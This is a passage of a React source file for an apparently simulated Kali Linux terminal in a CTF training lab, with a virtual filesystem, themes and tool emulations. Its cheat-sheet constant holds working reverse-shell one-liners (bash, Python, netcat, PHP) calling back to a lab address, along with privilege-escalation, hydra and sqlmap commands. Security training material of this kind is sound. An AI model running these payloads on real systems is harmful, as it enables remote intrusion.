"use client";

import { useState, useEffect, useRef, useCallback } from "react";
import { terminalApi } from "@/lib/api";
import {
  Terminal as TerminalIcon,
  Search,
  Download,
  Loader2,
  CheckCircle2,
  XCircle,
  AlertTriangle,
  Clock,
  ShieldAlert,
  ChevronRight,
  Cpu,
  HardDrive,
  Copy,
  Check,
  Plus,
  X,
  Maximize2,
  Minimize2,
  RotateCcw,
  Volume2,
  VolumeX,
  Sparkles,
  Shield,
  Skull,
  Wifi,
  Layers,
  Folder,
  Play,
  Columns,
  Rows,
  BookOpen,
  FileCode,
  Save,
  Square
} from "lucide-react";

// ─── KALI LINUX DRAGON ASCII ──────────────────────────────────
const KALI_DRAGON_ASCII = `
..............
            ..,;:ccc,.
          ......''';lxO.
  .....''''..........,:ld;
           .';;;:::;,,.x:
      ..'''.            0Xxoc:,.  ...
  ....                ,ONkc;,;cokOdc',.
 .                   OMo  ':dd::. 
                    dMc               :q
                    0M.            .:ooo:
                    ;Wd         .__~o/
                     ;Wd       /
                      ;MN      :
`;

const KALI_DRAGON_ART = [
  "..............",
  "            ..,;:ccc,.",
  "          ......''';lxO.",
  "  .....''''..........,:ld;",
  "           .';;;:::;,,.x:",
  "      ..'''.            0Xxoc:,.  ...",
  "  ....                ,ONkc;,;cokOdc',.",
  " .                   OMo  ':dd::. ",
  "                    dMc               :q",
  "                    0M.            .:ooo:",
  "                    ;Wd         .__~o/",
  "                     ;Wd       /",
  "                      ;MN      :",
];

// ─── KNOWN COMMANDS & AUTOSUGGESTIONS ────────────────────────
const KNOWN_COMMANDS = [
  "nmap", "msfconsole", "gobuster", "dirb", "sqlmap", "hydra", "hashcat",
  "nikto", "wireshark", "whoami", "id", "uname", "ifconfig", "ip",
  "ls", "cd", "pwd", "cat", "clear", "help", "neofetch", "fastfetch", "sudo",
  "su", "ping", "kali-tools", "exit", "date", "uptime", "history",
  "touch", "mkdir", "rm", "python", "node", "git", "curl", "nano",
  "cmatrix", "htop", "top", "searchsploit", "base64", "man", "echo", "grep"
];

const COMMON_AUTOCOMPLETE_MAP = {
  "n": "nmap -sV -sC 10.10.11.23",
  "nm": "nmap -sV -sC -p 21,22,80,443 10.10.11.23",
  "m": "msfconsole",
  "ms": "msfconsole",
  "go": "gobuster dir -u http://10.10.11.23 -w /home/kali/wordlists/common.txt",
  "sq": "sqlmap -u http://10.10.11.23/item?id=1 --dbs",
  "hy": "hydra -l admin -P /home/kali/wordlists/rockyou.txt 10.10.11.23 ssh",
  "ha": "hashcat -m 0 -a 0 hashes.txt /home/kali/wordlists/rockyou.txt",
  "if": "ifconfig",
  "ip": "ip a",
  "wh": "whoami",
  "un": "uname -a",
  "su": "sudo su",
  "ca": "cat notes.txt",
  "cm": "cmatrix",
  "ht": "htop",
  "na": "nano notes.txt",
  "se": "searchsploit vsftpd 2.3.4",
  "ka": "kali-tools",
  "ne": "neofetch"
};

// ─── INITIAL VIRTUAL FILESYSTEM ──────────────────────────────
const DEFAULT_FS = {
  "/home/kali": [
    { name: "tools", type: "dir", perms: "drwxr-xr-x", owner: "kali", group: "kali", size: "4.0K", date: "Sep 03 18:30" },
    { name: "scans", type: "dir", perms: "drwxr-xr-x", owner: "kali", group: "kali", size: "4.0K", date: "Sep 03 19:15" },
    { name: "wordlists", type: "dir", perms: "drwxr-xr-x", owner: "kali", group: "kali", size: "4.0K", date: "Sep 03 20:00" },
    { name: "notes.txt", type: "file", perms: "-rw-r--r--", owner: "kali", group: "kali", size: "382B", date: "Sep 03 22:45", content: "[KRYNTRA CTF LAB NOTES]\nTarget: 10.10.11.23 (Staging Gateway)\nOpen services: 21 (vsftpd 3.0.3), 22 (OpenSSH 8.9), 80 (Apache 2.4.52), 443 (Nginx)\nFindings: Anonymous FTP enabled. Check /pub/backup.tar.gz for credentials." },
    { name: "target_scope.md", type: "file", perms: "-rw-r--r--", owner: "kali", group: "kali", size: "214B", date: "Sep 03 21:10", content: "# Authorized Target Scope\nCIDR: 10.10.11.0/24\nGateway: 10.10.11.1\nVPN Tunnel: tun0 (10.10.14.23/24)\nRules of Engagement: Non-destructive testing only." },
    { name: "recon.sh", type: "file", perms: "-rwxr-xr-x", owner: "kali", group: "kali", size: "540B", date: "Sep 03 22:00", content: "#!/usr/bin/env bash\n# Automated Recon Script\nTARGET=$1\necho \"[*] Starting nmap discovery on $TARGET...\"\nnmap -sV -sC -p 21,22,80,443 -oN scans/quick.nmap $TARGET" },
  ],
  "/home/kali/tools": [
    { name: "linpeas.sh", type: "file", perms: "-rwxr-xr-x", owner: "kali", group: "kali", size: "340KB", date: "Aug 20 12:00", content: "#!/bin/sh\n# LinPEAS - Linux Privilege Escalation Awesome Script\necho \"[+] Checking sudo permissions...\"" },
    { name: "chisel", type: "file", perms: "-rwxr-xr-x", owner: "kali", group: "kali", size: "8.2MB", date: "Aug 15 09:30", content: "ELF 64-bit LSB executable, x86-64" },
    { name: "mimikatz.exe", type: "file", perms: "-rwxr-xr-x", owner: "kali", group: "kali", size: "1.4MB", date: "Jul 10 14:20", content: "MZ Windows PE executable" },
  ],
  "/home/kali/scans": [
    { name: "nmap_full.txt", type: "file", perms: "-rw-r--r--", owner: "kali", group: "kali", size: "1.8KB", date: "Sep 03 22:15", content: "Nmap 7.94SVN scan initiated on 10.10.11.23\nHost is up (0.024s latency).\n21/tcp open ftp vsftpd 3.0.3\n22/tcp open ssh OpenSSH 8.9p1\n80/tcp open http Apache 2.4.52\n443/tcp open ssl/https nginx 1.18.0" },
  ],
  "/home/kali/wordlists": [
    { name: "rockyou.txt", type: "file", perms: "-rw-r--r--", owner: "kali", group: "kali", size: "134MB", date: "Jan 01 00:00", content: "123456\npassword\n12345678\nqwerty\n123456789\nfootball\niloveyou\nadmin\nwelcome" },
    { name: "common.txt", type: "file", perms: "-rw-r--r--", owner: "kali", group: "kali", size: "45KB", date: "Jan 01 00:00", content: "admin\napi\nassets\nbackup\nconfig\ndashboard\nfiles\nlogin\nportal\nrobots.txt\nuploads" },
  ],
  "/etc": [
    { name: "os-release", type: "file", perms: "-rw-r--r--", owner: "root", group: "root", size: "268B", date: "Sep 01 00:00", content: `PRETTY_NAME="Kali GNU/Linux Rolling"
NAME="Kali GNU/Linux"
VERSION_ID="2026.1"
VERSION="2026.1"
VERSION_CODENAME="kali-rolling"
ID=kali
ID_LIKE=debian
HOME_URL="https://www.kali.org/"
SUPPORT_URL="https://forums.kali.org/"
BUG_REPORT_URL="https://bugs.kali.org/"` },
    { name: "issue", type: "file", perms: "-rw-r--r--", owner: "root", group: "root", size: "42B", date: "Sep 01 00:00", content: "Kali GNU/Linux Rolling \\n \\l\n" },
    { name: "passwd", type: "file", perms: "-rw-r--r--", owner: "root", group: "root", size: "1.4KB", date: "Sep 01 00:00", content: "root:x:0:0:root:/root:/usr/bin/zsh\nkali:x:1000:1000:Kali User,,,:/home/kali:/usr/bin/zsh\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\npostgres:x:114:120:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash" },
    { name: "hosts", type: "file", perms: "-rw-r--r--", owner: "root", group: "root", size: "158B", date: "Sep 01 00:00", content: "127.0.0.1\tlocalhost\n127.0.1.1\tkali\n10.10.11.23\tgateway.kryntra.local\n10.10.14.23\tkali.vpn" }
  ],
  "/root": [
    { name: "flag.txt", type: "file", perms: "-rw-------", owner: "root", group: "root", size: "38B", date: "Sep 01 00:00", content: "KRYNTRA{k4l1_l1nux_r00t_4cc3ss_gr4nt3d}" },
    { name: ".zshrc", type: "file", perms: "-rw-r--r--", owner: "root", group: "root", size: "3.2KB", date: "Sep 01 00:00", content: "# Kali Root ZSH configuration" }
  ]
};

// ─── CHEAT SHEET PAYLOADS ────────────────────────────────────
const CHEATSHEET_PAYLOADS = [
  {
    category: "Reverse Shells",
    items: [
      { name: "Bash TCP Reverse Shell", cmd: "bash -i >& /dev/tcp/10.10.14.23/4444 0>&1" },
      { name: "Python3 Interactive PTY Shell", cmd: "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"10.10.14.23\",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'" },
      { name: "Netcat Mkfifo Shell", cmd: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.23 4444 >/tmp/f" },
      { name: "PHP One-Liner Shell", cmd: "php -r '$sock=fsockopen(\"10.10.14.23\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" }
    ]
  },
  {
    category: "Privilege Escalation",
    items: [
      { name: "SUID Binaries Discovery", cmd: "find / -perm -u=s -type f 2>/dev/null" },
      { name: "Check Sudo Privileges", cmd: "sudo -l" },
      { name: "World-Writable Directories", cmd: "find / -writable -type d 2>/dev/null" },
      { name: "Capabilities Inspection", cmd: "getcap -r / 2>/dev/null" }
    ]
  },
  {
    category: "Reconnaissance & Enumeration",
    items: [
      { name: "Full Nmap Scan", cmd: "nmap -p- -sV -sC -T4 10.10.11.23" },
      { name: "Web Directory Brute-Force", cmd: "gobuster dir -u http://10.10.11.23 -w /home/kali/wordlists/common.txt" },
      { name: "Exploit-DB Vulnerability Search", cmd: "searchsploit vsftpd 2.3.4" },
      { name: "Check Listening Ports", cmd: "ss -tulpn" }
    ]
  }
];

// ─── THEMES ──────────────────────────────────────────────────
const THEMES = {
  "kali-dark": {
    name: "Kali Dark (Default)",
    bg: "#0c101a",
    bodyBg: "#080c14",
    border: "#182234",
    headerBg: "#0f1624",
    tabActive: "#141c2e",
    tabInactive: "#0a0e18",
    promptPath: "text-blue-400",
    promptSymbol: "text-blue-500",
    rootSymbol: "text-rose-500",
    text: "text-slate-200",
    accent: "#00d9ff",
    accentGlow: "rgba(0, 217, 255, 0.2)",
    dragonColor: "text-cyan-400"
  },
  "kali-undercover": {
    name: "Kali Undercover (Win10)",
    bg: "#1e1e1e",
    bodyBg: "#121212",
    border: "#333333",
    headerBg: "#252526",
    tabActive: "#1e1e1e",
    tabInactive: "#2d2d2d",
    promptPath: "text-sky-300",
    promptSymbol: "text-sky-400",
    rootSymbol: "text-red-400",
    text: "text-gray-100",
    accent: "#0078d7",
    accentGlow: "rgba(0, 120, 215, 0.2)",
    dragonColor: "text-sky-400"
  },
  "matrix-green": {
    name: "Matrix Phosphor",
    bg: "#040d06",
    bodyBg: "#020703",
    border: "#0e3814",
    headerBg: "#061709",
    tabActive: "#0a2610",
    tabInactive: "#030a04",
    promptPath: "text-emerald-400",
    promptSymbol: "text-emerald-500",
    rootSymbol: "text-emerald-300 font-bold",
    text: "text-emerald-300",
    accent: "#10b981",
    accentGlow: "rgba(16, 185, 129, 0.25)",
    dragonColor: "text-emerald-400"
  },
  "cyberpunk": {
    name: "Cyberpunk Neon",
    bg: "#0d0918",
    bodyBg: "#07040f",
    border: "#2b144d",
    headerBg: "#140e26",
    tabActive: "#1f153b",
    tabInactive: "#0a0614",
    promptPath: "text-fuchsia-400",
    promptSymbol: "text-cyan-400",
    rootSymbol: "text-pink-500",
    text: "text-pink-100",
    accent: "#d946ef",
    accentGlow: "rgba(217, 70, 239, 0.25)",
    dragonColor: "text-cyan-300"
  }
};

// ─── AUDIO SYNTHESIZER ───────────────────────────────────────
function playBellSound() {
  try {
    const AudioContext = window.AudioContext || window.webkitAudioContext;
    if (!AudioContext) return;
    const ctx = new AudioContext();
    const osc = ctx.createOscillator();
    const gain = ctx.createGain();
    osc.type = "sine";
    osc.frequency.setValueAtTime(750, ctx.currentTime);
    gain.gain.setValueAtTime(0.08, ctx.currentTime);
    gain.gain.exponentialRampToValueAtTime(0.0001, ctx.currentTime + 0.12);
    osc.connect(gain);
    gain.connect(ctx.destination);
    osc.start();
    osc.stop(ctx.currentTime + 0.12);
  } catch (e) {}
}

// ─── NEOFETCH HELPER ─────────────────────────────────────────
function generateNeofetch(user = "kali", hostname = "kali") {
  const specs = [
    { label: `${user}@${hostname}`, value: "", header: true },
    { label: "-------------------", value: "", divider: true },
    { label: "OS", value: "Kali GNU/Linux Rolling x86_64" },
    { label: "Host", value: "KRYNTRA Autonomous Cyber Defense" },
    { label: "Kernel", value: "6.8.11-kali1-amd64" },
    { label: "Uptime", value: "4 hours, 28 mins" },
    { label: "Packages", value: "2847 (dpkg)" },
    { label: "Shell", value: "zsh 5.9 (x86_64-debian-linux-gnu)" },
    { label: "Resolution", value: "1920x1080" },
    { label: "DE", value: "Xfce 4.18" },
    { label: "WM", value: "Xfwm4" },
    { label: "Terminal", value: "qterminal 1.4.0" },
    { label: "CPU", value: "AMD Ryzen 9 7950X (32) @ 4.500GHz" },
    { label: "GPU", value: "NVIDIA GeForce RTX 4090" },
    { label: "Memory", value: "4120MiB / 32115MiB" },
  ];

  return {
    isNeofetch: true,
    dragonLines: KALI_DRAGON_ART,
    specs: specs
  };
}

// ─── CMATRIX RAIN COMPONENT ──────────────────────────────────
function CMatrixCanvas({ onExit }) {
  const canvasRef = useRef(null);

  useEffect(() => {
    const canvas = canvasRef.current;
    if (!canvas) return;
    const ctx = canvas.getContext("2d");
    let width = (canvas.width = canvas.parentElement.clientWidth || 800);
    let height = (canvas.height = canvas.parentElement.clientHeight || 400);

    const cols = Math.floor(width / 16);
    const drops = Array(cols).fill(1);
    const katakana = "0123456789ABCDEFabcdefｦｱｳｴｵｶｷｹｺｻｼｽｾｿﾀﾂﾃﾅﾆﾇﾈﾊﾋﾎﾏﾐﾑﾒﾓﾔﾕﾗﾘﾜ";

    let animId;
    const draw = () => {
      ctx.fillStyle = "rgba(4, 13, 6, 0.1)";
      ctx.fillRect(0, 0, width, height);

      ctx.fillStyle = "#00ff66";
      ctx.font = "14px 'JetBrains Mono', monospace";

      for (let i = 0; i < drops.length; i++) {
        const text = katakana[Math.floor(Math.random() * katakana.length)];
        ctx.fillText(text, i * 16, drops[i] * 16);

        if (drops[i] * 16 > height && Math.random() > 0.975) {
          drops[i] = 0;
        }
        drops[i]++;
      }
      animId = requestAnimationFrame(draw);
    };

    draw();

    const handleKey = (e) => {
      if (e.key === "q" || (e.ctrlKey && e.key === "c") || e.key === "Escape") {
        onExit();
      }
    };
    window.addEventListener("keydown", handleKey);

    return () => {
      cancelAnimationFrame(animId);
      window.removeEventListener("keydown", handleKey);
    };
  }, [onExit]);

  return (
    <div className="relative w-full h-[400px] bg-[#020703] rounded-lg overflow-hidden border border-emerald-900/60 my-2">
      <canvas ref={canvasRef} className="w-full h-full block" />
      <div className="absolute top-2 right-2 bg-emerald-950/80 border border-emerald-600/40 text-emerald-300 text-[11px] font-mono px-2 py-1 rounded flex items-center gap-2">
        <span>Press <kbd className="bg-emerald-900 px-1 py-0.5 rounded text-white font-bold">q</kbd> or <kbd className="bg-emerald-900 px-1 py-0.5 rounded text-white font-bold">Ctrl+C</kbd> to exit</span>
        <button onClick={onExit} className="text-emerald-400 hover:text-white"><X className="w-3.5 h-3.5" /></button>
      </div>
    </div>
  );
}

// ─── HTOP PROCESS MONITOR COMPONENT ──────────────────────────
function HTopView({ onExit }) {
  const [tasks, setTasks] = useState([
    { pid: 1, user: "root", pri: 20, ni: 0, virt: "168M", res: "12M", shr: "8M", s: "S", cpu: "0.0", mem: "0.1", time: "0:01.42", cmd: "/sbin/init splash" },
    { pid: 482, user: "root", pri: 20, ni: 0, virt: "28M", res: "5M", shr: "4M", s: "S", cpu: "0.0", mem: "0.0", time: "0:00.18", cmd: "/usr/lib/systemd/systemd-journald" },
    { pid: 890, user: "root", pri: 20, ni: 0, virt: "14M", res: "4M", shr: "3M", s: "S", cpu: "0.1", mem: "0.0", time: "0:00.65", cmd: "sshd: /usr/sbin/sshd -D [listener]" },
    { pid: 1042, user: "root", pri: 20, ni: 0, virt: "45M", res: "14M", shr: "9M", s: "S", cpu: "0.2", mem: "0.2", time: "0:04.12", cmd: "/usr/sbin/openvpn --config /etc/openvpn/tun0.ovpn" },
    { pid: 1120, user: "kali", pri: 20, ni: 0, virt: "142M", res: "48M", shr: "32M", s: "S", cpu: "0.5", mem: "0.4", time: "0:12.30", cmd: "xfce4-session" },
    { pid: 1420, user: "kali", pri: 20, ni: 0, virt: "210M", res: "64M", shr: "42M", s: "S", cpu: "1.2", mem: "0.8", time: "0:08.52", cmd: "qterminal" },
    { pid: 1845, user: "kali", pri: 20, ni: 0, virt: "18M", res: "7M", shr: "4M", s: "S", cpu: "0.0", mem: "0.1", time: "0:00.22", cmd: "/bin/zsh" },
    { pid: 2410, user: "www-data", pri: 20, ni: 0, virt: "180M", res: "32M", shr: "18M", s: "S", cpu: "0.3", mem: "0.3", time: "0:02.10", cmd: "/usr/sbin/apache2 -k start" },
    { pid: 2840, user: "mysql", pri: 20, ni: 0, virt: "1.2G", res: "410M", shr: "38M", s: "S", cpu: "1.8", mem: "1.3", time: "0:18.40", cmd: "/usr/sbin/mysqld" },
  ]);

  useEffect(() => {
    const handleKey = (e) => {
      if (e.key === "q" || (e.ctrlKey && e.key === "c") || e.key === "Escape") {
        onExit();
      }
    };
    window.addEventListener("keydown", handleKey);
    return () => window.removeEventListener("keydown", handleKey);
  }, [onExit]);

  return (
    <div className="bg-[#080d16] border border-cyan-800/40 rounded-lg p-3 font-mono text-xs my-2 select-none shadow-xl">
      <div className="flex items-center justify-between border-b border-[#1c2a44] pb-2 mb-3">
        <div className="flex items-center gap-2">
          <span className="bg-cyan-500 text-slate-950 px-2 py-0.5 rounded font-bold text-[10px]">htop 3.2.2</span>
          <span className="text-cyan-400 font-semibold">Kali Linux System Monitor</span>
        </div>
        <button
          onClick={onExit}
          className="px-2 py-0.5 rounded bg-rose-950/60 border border-rose-800 text-rose-300 hover:bg-rose-900 text-[11px] flex items-center gap-1"
        >
          <X className="w-3 h-3" /> Exit (q)
        </button>
      </div>

      {/* Gauges */}
      <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 mb-4 text-[11px]">
        <div className="space-y-1">
          <div className="flex items-center gap-2">
            <span className="text-cyan-400 w-12 font-bold">1  [|||||</span>
            <div className="flex-1 bg-[#10192b] h-3 rounded overflow-hidden">
              <div className="bg-cyan-500 h-full w-[24%]" />
            </div>
            <span className="text-slate-300 w-12 text-right">24.2%]</span>
          </div>
          <div className="flex items-center gap-2">
            <span className="text-cyan-400 w-12 font-bold">2  [|||||||</span>
            <div className="flex-1 bg-[#10192b] h-3 rounded overflow-hidden">
              <div className="bg-cyan-500 h-full w-[38%]" />
            </div>
            <span className="text-slate-300 w-12 text-right">38.0%]</span>
          </div>
          <div className="flex items-center gap-2">
            <span className="text-cyan-400 w-12 font-bold">3  [|||</span>
            <div className="flex-1 bg-[#10192b] h-3 rounded overflow-hidden">
              <div className="bg-cyan-500 h-full w-[12%]" />
            </div>
            <span className="text-slate-300 w-12 text-right">12.5%]</span>
          </div>
          <div className="flex items-center gap-2">
            <span className="text-cyan-400 w-12 font-bold">4  [|||||||||</span>
            <div className="flex-1 bg-[#10192b] h-3 rounded overflow-hidden">
              <div className="bg-cyan-500 h-full w-[45%]" />
            </div>
            <span className="text-slate-300 w-12 text-right">45.1%]</span>
          </div>
        </div>

        <div className="space-y-1 text-slate-300">
          <div className="flex items-center gap-2">
            <span className="text-emerald-400 w-12 font-bold">Mem [|||</span>
            <div className="flex-1 bg-[#10192b] h-3 rounded overflow-hidden">
              <div className="bg-emerald-500 h-full w-[28%]" />
            </div>
            <span className="text-slate-300">4.12G/31.3G]</span>
          </div>
          <div className="flex items-center gap-2">
            <span className="text-blue-400 w-12 font-bold">Swp [</span>
            <div className="flex-1 bg-[#10192b] h-3 rounded overflow-hidden">
              <div className="bg-blue-500 h-full w-[0%]" />
            </div>
            <span className="text-slate-300">0K/8.00G]</span>
          </div>
          <div className="pt-1 text-[10px] text-slate-400 flex items-center justify-between">
            <span>Tasks: 84, 1 thr; 1 running</span>
            <span>Load average: 0.28 0.22 0.19</span>
          </div>
          <div className="text-[10px] text-slate-400">
            <span>Uptime: 04:28:15</span>
          </div>
        </div>
      </div>

      {/* Process Table */}
      <div className="overflow-x-auto max-h-56 overflow-y-auto border border-[#16233a] rounded bg-[#060a12]">
        <table className="w-full text-[11px] text-left">
          <thead className="bg-[#0f172a] text-cyan-400 sticky top-0">
            <tr>
              <th className="p-1.5">PID</th>
              <th className="p-1.5">USER</th>
              <th className="p-1.5">PRI</th>
              <th className="p-1.5">NI</th>
              <th className="p-1.5">VIRT</th>
              <th className="p-1.5">RES</th>
              <th className="p-1.5">SHR</th>
              <th className="p-1.5">S</th>
              <th className="p-1.5">CPU%</th>
              <th className="p-1.5">MEM%</th>
              <th className="p-1.5">TIME+</th>
              <th className="p-1.5">Command</th>
            </tr>
          </thead>
          <tbody className="divide-y divide-[#131e33] text-slate-300">
            {tasks.map(t => (
              <tr key={t.pid} className="hover:bg-[#0e1728]">
                <td className="p-1.5 text-cyan-300">{t.pid}</td>
                <td className="p-1.5 text-slate-400">{t.user}</td>
                <td className="p-1.5">{t.pri}</td>
                <td className="p-1.5">{t.ni}</td>
                <td className="p-1.5 text-slate-400">{t.virt}</td>
                <td className="p-1.5 text-slate-400">{t.res}</td>
                <td className="p-1.5 text-slate-500">{t.shr}</td>
                <td className="p-1.5 text-emerald-400">{t.s}</td>
                <td className="p-1.5 font-bold text-cyan-400">{t.cpu}</td>
                <td className="p-1.5">{t.mem}</td>
                <td className="p-1.5 text-slate-500">{t.time}</td>
                <td className="p-1.5 font-semibold text-slate-200">{t.cmd}</td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>

      <div className="mt-2 text-[10px] text-slate-500 flex items-center justify-between">
        <span>F1 Help  F2 Setup  F3 Search  F4 Filter  F5 Tree  F6 SortBy  F9 Kill  F10 Quit</span>
        <span>Press <kbd className="bg-[#121c2e] px-1 py-0.5 rounded text-cyan-400">q</kbd> to quit htop</span>
      </div>
    </div>
  );
}

// ─── NANO IN-TERMINAL TEXT EDITOR ────────────────────────────
function NanoEditor({ filename, initialContent, onSave, onExit }) {
  const [content, setContent] = useState(initialContent || "");
  const [modified, setModified] = useState(false);
  const [statusMsg, setStatusMsg] = useState("");
  const textareaRef = useRef(null);

  useEffect(() => {
    textareaRef.current?.focus();
  }, []);

  const handleSave = () => {
    onSave(filename, content);
    setModified(false);
    setStatusMsg(`[ Wrote ${content.split("\n").length} lines to ${filename} ]`);
    setTimeout(() => setStatusMsg(""), 2500);
  };

  const handleKeyDown = (e) => {
    if (e.ctrlKey && e.key === "o") {
      e.preventDefault();
      handleSave();
    }
    if (e.ctrlKey && e.key === "x") {
      e.preventDefault();
      onExit();
    }
  };

  return (
    <div
      onKeyDown={handleKeyDown}
      className="flex flex-col h-[420px] bg-[#0c101c] border border-cyan-800/40 rounded-lg overflow-hidden font-mono text-xs my-2 shadow-2xl"
    >
      {/* Nano Top Header */}
      <div className="bg-[#141b2c] px-3 py-1 text-slate-300 flex items-center justify-between border-b border-[#1f2a42] select-none">
        <span className="font-bold text-cyan-400">GNU nano 7.2</span>
        <span className="font-semibold text-white">File: {filename}</span>
        <span className="text-[11px] text-amber-400 font-semibold">
          {modified ? "Modified" : "Saved"}
        </span>
      </div>

      {/* Editor Body */}
      <textarea
        ref={textareaRef}
        value={content}
        onChange={(e) => {
          setContent(e.target.value);
          setModified(true);
        }}
        className="flex-1 w-full p-3 bg-transparent text-slate-100 resize-none focus:outline-none font-mono text-xs leading-relaxed selection:bg-cyan-500/30"
        placeholder="Type here..."
      />

      {/* Status Bar */}
      <div className="bg-[#101726] px-3 py-1 text-[11px] border-t border-[#1c263c] flex items-center justify-between text-slate-400 select-none">
        <span className="text-cyan-300 font-semibold">{statusMsg || `Lines: ${content.split("\n").length}`}</span>
        <div className="flex items-center gap-2">
          <button
            onClick={handleSave}
            className="px-2 py-0.5 rounded bg-cyan-600/30 hover:bg-cyan-600/50 text-cyan-300 border border-cyan-500/40 flex items-center gap-1"
          >
            <Save className="w-3 h-3" /> ^O WriteOut
          </button>
          <button
            onClick={onExit}
            className="px-2 py-0.5 rounded bg-rose-600/30 hover:bg-rose-600/50 text-rose-300 border border-rose-500/40 flex items-center gap-1"
          >
            <X className="w-3 h-3" /> ^X Exit
          </button>
        </div>
      </div>

      {/* Nano Shortcut Bar */}
      <div className="bg-[#090d16] px-3 py-1 text-[10px] text-slate-500 border-t border-[#162033] grid grid-cols-4 sm:grid-cols-6 gap-1 select-none">
        <span>^G Get Help</span>
        <span>^O WriteOut</span>
        <span>^W Where Is</span>
        <span>^K Cut Text</span>
        <span>^U Paste Text</span>
        <span>^X Exit</span>
      </div>
    </div>
  );
}

// ─── SYNTAX HIGHLIGHTER DISPLAY HELPER ───────────────────────
function renderHighlightedInput(input, ghostText) {
  if (!input) {
    return ghostText ? <span className="text-slate-600 select-none">{ghostText}</span> : null;
  }

  const parts = input.split(" ");
  const firstWord = parts[0].toLowerCase();
  const rest = parts.slice(1).join(" ");
  const isRecognized = KNOWN_COMMANDS.includes(firstWord);

  return (
    <span className="pointer-events-none">
      <span className={isRecognized ? "text-emerald-400 font-bold" : "text-rose-400 font-semibold"}>
        {parts[0]}
      </span>
      {parts.length > 1 && (
        <span>
          {" "}
          {parts.slice(1).map((token, i) => {
            if (token.startsWith("-")) {
              return <span key={i} className="text-amber-300 font-medium">{token} </span>;
            }
            if (token.includes("/") || token.startsWith("~")) {
              return <span key={i} className="text-cyan-300">{token} </span>;
            }
            return <span key={i} className="text-slate-200">{token} </span>;
          })}
        </span>
      )}
      {ghostText && <span className="text-slate-600 select-none">{ghostText}</span>}
    </span>
  );
}

// ─── MAIN KALI TERMINAL COMPONENT ────────────────────────────
export default function KaliTerminalPage() {
  const [themeKey, setThemeKey] = useState("kali-dark");
  const [soundEnabled, setSoundEnabled] = useState(true);
  const [isFullscreen, setIsFullscreen] = useState(false);
  const [fontSize, setFontSize] = useState("text-xs");
  const [activeTabId, setActiveTabId] = useState(1);
  const [splitMode, setSplitMode] = useState("none"); // "none", "horizontal", "vertical"
  const [splitActivePane, setSplitActivePane] = useState(1); // 1 or 2
  const [loading, setLoading] = useState(false);
  const [copiedIndex, setCopiedIndex] = useState(null);
  const [showQuickArsenal, setShowQuickArsenal] = useState(true);
  const [showCheatSheet, setShowCheatSheet] = useState(false);

  // Active Interactive Mode (cmatrix, htop, nano)
  const [activeApp, setActiveApp] = useState(null); // null, { type: 'cmatrix' }, { type: 'htop' }, { type: 'nano', file: '...' }

  const theme = THEMES[themeKey] || THEMES["kali-dark"];

  // Tab State
  const [tabs, setTabs] = useState([
    {
      id: 1,
      title: "1. kali@kali: ~",
      user: "kali",
      hostname: "kali",
      cwd: "~",
      msfMode: false,
      msfPrompt: "msf6 > ",
      input: "",
      ghostText: "",
      history: [
        {
          command: "neofetch",
          user: "kali",
          cwd: "~",
          timestamp: new Date().toLocaleTimeString(),
          content: generateNeofetch("kali", "kali")
        }
      ],
      cmdHistory: ["neofetch"],
      historyIdx: -1,
      fs: JSON.parse(JSON.stringify(DEFAULT_FS))
    }
  ]);

  const activeTab = tabs.find(t => t.id === activeTabId) || tabs[0];
  const inputRef = useRef(null);
  const scrollRef = useRef(null);
  const terminalWrapperRef = useRef(null);

  // Update active tab state helper
  const updateActiveTab = useCallback((updater) => {
    setTabs(prevTabs =>
      prevTabs.map(t => (t.id === activeTabId ? { ...t, ...(typeof updater === "function" ? updater(t) : updater) } : t))
    );
  }, [activeTabId]);

  // Scroll to bottom on history change
  useEffect(() => {
    if (scrollRef.current) {
      scrollRef.current.scrollTop = scrollRef.current.scrollHeight;
    }
  }, [activeTab?.history, loading, activeApp]);

  useEffect(() => {
    inputRef.current?.focus();
  }, [activeTabId, activeApp]);

  // Tab switching shortcuts (Alt+1..9) and fullscreen
  useEffect(() => {
    const handleKeyDown = (e) => {
      if (e.altKey && e.key >= "1" && e.key <= "9") {
        const targetIdx = parseInt(e.key, 10) - 1;
        if (tabs[targetIdx]) {
          e.preventDefault();
          setActiveTabId(tabs[targetIdx].id);
        }
      }
      if (e.key === "F11") {
        e.preventDefault();
        setIsFullscreen(prev => !prev);
      }
      if (e.ctrlKey && e.key === "l" && !activeApp) {
        e.preventDefault();
        updateActiveTab({ history: [] });
      }
      if (e.ctrlKey && e.key === "c" && activeApp) {
        e.preventDefault();
        setActiveApp(null);
      }
    };
    window.addEventListener("keydown", handleKeyDown);
    return () => window.removeEventListener("keydown", handleKeyDown);
  }, [tabs, updateActiveTab, activeApp]);

  // Ghost text calculator
  const computeGhostText = (val) => {
    if (!val) return "";
    const trimmed = val.toLowerCase().trim();
    // 1. Check common autocomplete map
    if (COMMON_AUTOCOMPLETE_MAP[trimmed]) {
      const full = COMMON_AUTOCOMPLETE_MAP[trimmed];
      if (full.toLowerCase().startsWith(val.toLowerCase())) {
        return full.slice(val.length);
      }
    }
    // 2. Check previous command history
    const matchHistory = activeTab.cmdHistory.find(c => c.toLowerCase().startsWith(val.toLowerCase()) && c !== val);
    if (matchHistory) {
      return matchHistory.slice(val.length);
    }
    // 3. Check known commands
    const matchCmd = KNOWN_COMMANDS.find(c => c.toLowerCase().startsWith(val.toLowerCase()) && c !== val);
    if (matchCmd) {
      return matchCmd.slice(val.length);
    }
    return "";
  };

  const handleInputChange = (e) => {
    const val = e.target.value;
    const ghost = computeGhostText(val);
    updateActiveTab({ input: val, ghostText: ghost });
  };

  // Create new tab
  const createNewTab = () => {
    const newId = Date.now();
    const newTabNum = tabs.length + 1;
    const newTab = {
      id: newId,
      title: `${newTabNum}. kali@kali: ~`,
      user: "kali",
      hostname: "kali",
      cwd: "~",
      msfMode: false,
      msfPrompt: "msf6 > ",
      input: "",
      ghostText: "",
      history: [
        {
          command: "neofetch",
